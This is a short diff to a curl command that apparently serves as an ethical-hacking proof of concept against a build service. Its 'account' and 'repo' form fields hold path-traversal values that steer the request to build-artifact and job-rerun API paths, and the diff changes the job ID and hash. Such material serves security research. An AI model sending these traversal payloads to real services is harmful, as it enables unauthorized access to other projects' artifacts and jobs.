@@ -1,9 +1,9 @@
 curl \
-  -F "account=../../api/buildjobs/huvyevgiymitc15r/artifacts/temperature_converter_example%2Fpayload.json?stream=true#" \
+  -F "account=../../api/buildjobs/sxpk742opqxhor28/artifacts/temperature_converter_example%2Fpayload.json?stream=true#" \
   -F "project=libssh2-ethicalhacking" \
   -F "buildid=1337" \
   -F "base=main" \
-  -F "hash=id" \
+  -F "hash=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
   -F "repo=../repos/STRUCTiX/libssh2-ethicalhacking/actions/jobs/10239701797/rerun#" \
   -F "ssh_host=127.0.0.1" \
   -F "ssh_port=22" \
